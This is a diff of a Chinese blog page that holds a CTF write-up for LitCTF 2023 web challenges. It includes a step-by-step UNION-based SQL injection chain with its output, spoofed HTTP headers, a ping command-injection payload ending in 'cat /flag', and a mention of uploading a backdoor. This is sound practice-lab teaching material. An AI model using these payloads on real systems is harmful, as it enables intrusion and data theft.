@@ -16,16 +16,16 @@
   <meta name="author" content="cat">
   <meta name="keywords" content="">
   
-    <meta name="description" content="这里是文章摘要">
+    <meta name="description" content="LitCTF 2023 （公开赛道）部分web题目writeup，还有misc和crypto的wp这次就不写了,因为大部分可以直接脚本出结果">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Writeup[LitCTF2023]">
 <meta property="og:url" content="http://sec-cat.github.io/2023/05/14/LitCTF2023/index.html">
 <meta property="og:site_name" content="Sec-cat&#39;s Blog">
-<meta property="og:description" content="这里是文章摘要">
+<meta property="og:description" content="LitCTF 2023 （公开赛道）部分web题目writeup，还有misc和crypto的wp这次就不写了,因为大部分可以直接脚本出结果">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://www.nssctf.cn/files/2023/4/24/4f18e3d989.png">
-<meta property="article:published_time" content="2023-05-14T04:06:00.000Z">
-<meta property="article:modified_time" content="2023-05-14T04:10:35.294Z">
+<meta property="article:published_time" content="2023-05-14T10:06:00.000Z">
+<meta property="article:modified_time" content="2023-05-14T09:32:59.448Z">
 <meta property="article:author" content="cat">
 <meta property="article:tag" content="writeup">
 <meta name="twitter:card" content="summary_large_image">
@@ -170,6 +170,18 @@
             </li>
           
         
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
         
           <li class="nav-item" id="search-btn">
             <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
@@ -210,8 +222,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-05-14 12:06" pubdate>
-          2023年5月14日 中午
+        <time datetime="2023-05-14 18:06" pubdate>
+          2023年5月14日 晚上
         </time>
       </span>
     
@@ -222,7 +234,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3.5k 字
+          3.6k 字
         
       </span>
     
@@ -233,7 +245,7 @@
         
         
         
-          30 分钟
+          31 分钟
         
       </span>
     
@@ -263,6 +275,94 @@
   <div class="row nomargin-x">
     <div class="side-col d-none d-lg-block col-lg-2">
       
+  <aside class="sidebar category-bar" style="margin-right: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="网络安全"
+        id="heading-a9fbbd40048656862e149a84b77b9b40" role="tab" data-toggle="collapse" href="#collapse-a9fbbd40048656862e149a84b77b9b40"
+        aria-expanded="true"
+      >
+        网络安全
+        <span class="list-group-count">(5)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-a9fbbd40048656862e149a84b77b9b40"
+           role="tabpanel" aria-labelledby="heading-a9fbbd40048656862e149a84b77b9b40">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2023/05/10/ctf_crypto/" title="CTF-CRYPTO"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CTF-CRYPTO</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2023/05/08/ctf_php/" title="CTF-PHP"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CTF-PHP</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2023/05/14/LitCTF2023/" title="Writeup[LitCTF2023]"
+           class="list-group-item list-group-item-action
+           active">
+          <span class="category-post">Writeup[LitCTF2023]</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2023/05/06/phpinterator/" title="关于php中原生类的应用"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">关于php中原生类的应用</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2023/04/26/alltools/" title="攻防武器库"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">攻防武器库</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
 
     </div>
 
@@ -276,7 +376,7 @@
               <p class="note note-info">
                 
                   
-                    本文最后更新于：1 分钟前
+                    本文最后更新于：12 分钟前
                   
                 
               </p>
@@ -285,7 +385,7 @@
               <div class="markdown-body">
                 
                 <div class="note note-success">
-            <p>这里是文章摘要</p>
+            <p>LitCTF 2023 （公开赛道）部分web题目writeup，还有misc和crypto的wp这次就不写了,因为大部分可以直接脚本出结果</p>
           </div>
 <span id="more"></span>
 <h2 id="web">web</h2>
@@ -325,59 +425,58 @@
 <p><code>描述</code></p>
 <blockquote>
 <p>提示：漏…漏了！<br>
-思路：页面提示&gt;队里师傅说Vim是世界上最好的编辑器，不接受反驳 can can need Vim,想到vim查看index.php.swp文件缓存<br>
-<code>exp</code></p>
+思路：页面提示&gt;队里师傅说Vim是世界上最好的编辑器，不接受反驳 can can need Vim,想到vim查看index.php.swp文件缓存</p>
 </blockquote>
+<p><code>exp</code></p>
 <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">node5<span class="hljs-selector-class">.anna</span><span class="hljs-selector-class">.nssctf</span><span class="hljs-selector-class">.cn</span>:<span class="hljs-number">28908</span>/<span class="hljs-selector-class">.index</span><span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.swp</span><br>vim -r index<span class="hljs-selector-class">.php</span>.swp<br></code></pre></td></tr></table></figure>
 <h3 id="作业管理系统">作业管理系统</h3>
 <p><code>描述</code></p>
 <blockquote>
 <p>提示：交作业！！但是哪里不对？<br>
-思路：看到有文件上传，考虑直接上传后门文件，连接后看到flag<br>
-<code>exp</code></p>
+思路：看到有文件上传，考虑直接上传后门文件，连接后看到flag</p>
 </blockquote>
+<p><code>exp</code></p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">网页中出现一个jpg地址：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/ProbiusOfficial/</span>My_pic<span class="hljs-regexp">/blob/m</span>ain/demo.jpg<br>进入后发现彩蛋<br>wow 你找到了第二个彩蛋哦~<br>_S0_ne3t? (<span class="hljs-number">2</span>/?)<br></code></pre></td></tr></table></figure>
 <h3 id="这是什么？SQL-注一下！">这是什么？SQL!注一下！</h3>
 <p><code>描述</code></p>
 <blockquote>
 <p>提示：为了安全起见多带了几个套罢了o(<em>////▽////</em>)q<br>
-思路：直接给出了sql语句<code>id = &quot;.'(((((('.$_GET[&quot;id&quot;].'))))))';</code>,开始注入<br>
-<code>exp</code></p>
+思路：直接给出了sql语句<code>id = &quot;.'(((((('.$_GET[&quot;id&quot;].'))))))';</code>,开始注入</p>
 </blockquote>
+<p><code>exp</code></p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># 数据库名<br>?id=<span class="hljs-number">-1</span>)))))) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">schema_name</span>) <span class="hljs-keyword">from</span> information_schema.schemata <span class="hljs-comment">--+</span><br><span class="hljs-keyword">Array</span> ( [<span class="hljs-number">0</span>] =&gt; <span class="hljs-keyword">Array</span> ( [username] =&gt; <span class="hljs-number">1</span> [<span class="hljs-keyword">password</span>] =&gt; information_schema,mysql,ctftraining,performance_schema,test,ctf ) )<br># 表名<br>?id=<span class="hljs-number">-1</span>)))))) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;ctftraining&#x27;</span><span class="hljs-comment">--+</span><br><span class="hljs-keyword">Array</span> ( [<span class="hljs-number">0</span>] =&gt; <span class="hljs-keyword">Array</span> ( [username] =&gt; <span class="hljs-number">1</span> [<span class="hljs-keyword">password</span>] =&gt; flag,news,users ) )<br>#列名<br>?id=<span class="hljs-number">-1</span>)))))) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;ctftraining.flag&#x27;</span><br><span class="hljs-keyword">Array</span> ( [<span class="hljs-number">0</span>] =&gt; <span class="hljs-keyword">Array</span> ( [username] =&gt; <span class="hljs-number">1</span> [<span class="hljs-keyword">password</span>] =&gt; flag) )<br># flag<br>?id=<span class="hljs-number">-1</span>)))))) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(flag) <span class="hljs-keyword">from</span> ctftraining.flag <span class="hljs-comment">--+</span><br><span class="hljs-keyword">Array</span> ( [<span class="hljs-number">0</span>] =&gt; <span class="hljs-keyword">Array</span> ( [username] =&gt; <span class="hljs-number">1</span> [<span class="hljs-keyword">password</span>] =&gt; NSSCTF&#123;xxx&#125; ) )<br><br># 彩蛋<br>?id=<span class="hljs-number">2</span><br><span class="hljs-keyword">Array</span> ( [<span class="hljs-number">0</span>] =&gt; <span class="hljs-keyword">Array</span> ( [username] =&gt; fake_flag [<span class="hljs-keyword">password</span>] =&gt; F1rst_to_Th3_eggggggggg!&#125; (<span class="hljs-number">4</span>/<span class="hljs-number">4</span>) ) )<br></code></pre></td></tr></table></figure>
 <h3 id="Http-pro-max-plus">Http pro max plus</h3>
 <p><code>描述</code></p>
 <blockquote>
 <p>提示：怎么还有一层…<br>
-思路：按提示层层绕过<br>
-<code>exp</code></p>
+思路：按提示层层绕过</p>
 </blockquote>
+<p><code>exp</code></p>
 <figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># 只允许本地访问</span><br>Client-ip： 127.0.0.1<br><span class="hljs-comment"># You are not from pornhub.com !</span><br><span class="hljs-section">Referer: pornhub.com</span><br><span class="hljs-comment"># 用Chrome浏览器啊!</span><br><span class="hljs-section">User-Agent: Chrome</span><br><span class="hljs-comment"># 不开代理你想上p站？代理服务器地址是Clash.win</span><br><span class="hljs-section">Via: Clash.win</span><br><span class="hljs-comment"># 借一步说话---&gt;&gt; /wtfwtfwtfwtf.php</span><br>f12 &gt; /sejishikong.php<br>拿上你的flag赶紧走NSSCTF&#123;xxx&#125;<br></code></pre></td></tr></table></figure>
 <h3 id="Ping">Ping</h3>
 <p><code>描述</code></p>
 <blockquote>
 <p>提示：拿上你的flag赶紧走NSSCTF{3d30e1d2-7735-4508-bc3c-b348d27cb0ca}<br>
-思路：尝试直接管道符，不行，hackbar load一下，发现post command=0.0.0.0&amp;ping=Ping<br>
-<code>exp</code></p>
+思路：尝试直接管道符，不行，hackbar load一下，发现post command=0.0.0.0&amp;ping=Ping</p>
 </blockquote>
+<p><code>exp</code></p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 构造payload</span><br><span class="hljs-attribute">command</span>=0.0.0.0|ls&amp;ping=Ping<br><span class="hljs-attribute">command</span>=0.0.0.0|cat /flag&amp;<span class="hljs-attribute">ping</span>=Ping<br></code></pre></td></tr></table></figure>
 <h3 id="就当无事发生">就当无事发生</h3>
 <p><code>描述</code></p>
 <blockquote>
 <p>提示：<a target="_blank" rel="noopener" href="https://ProbiusOfficial.github.io">https://ProbiusOfficial.github.io</a> 差点数据没脱敏就发出去了，还好还没来得及部署，重新再pull一次（x<br>
-思路：这题主要考察git commit迭代中会暴露的数据问题<br>
-<code>exp</code></p>
+思路：这题主要考察git commit迭代中会暴露的数据问题</p>
 </blockquote>
+<p><code>exp</code></p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">进入 https:<span class="hljs-regexp">//gi</span>thub.com/ProbiusOfficial<br>找到 https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/ProbiusOfficial/</span>ProbiusOfficial.github.io仓库<br>找到相应的commit ，爆出<br>&lt;p&gt;Flag LitCTF&#123;g1thub_c0mmit_1s_s0_us3ful&#125;&lt;<span class="hljs-regexp">/p&gt;]]&gt;&lt;/</span>content&gt;<br></code></pre></td></tr></table></figure>
-<h2 id="crypto">crypto</h2>
-<p><code>描述</code></p>
+<h2 id="总结">总结</h2>
 <blockquote>
-<p>提示：<br>
-思路：<br>
-<code>exp</code></p>
+<ol>
+<li>作为新生赛，题目比较简单，当然在部分题目上也认识到了自己的问题所在</li>
+<li>web部分还需要深入研究</li>
+<li>进一个网页后，第一件事就是<code>F12</code></li>
+</ol>
 </blockquote>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure>
-<h2 id="misc">misc</h2>
 
                 
               </div>
@@ -463,6 +562,23 @@
 
 
 
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/05/10/ctf_crypto/" title="CTF-CRYPTO">
+                        <span class="hidden-mobile">CTF-CRYPTO</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
               
             </div>
 
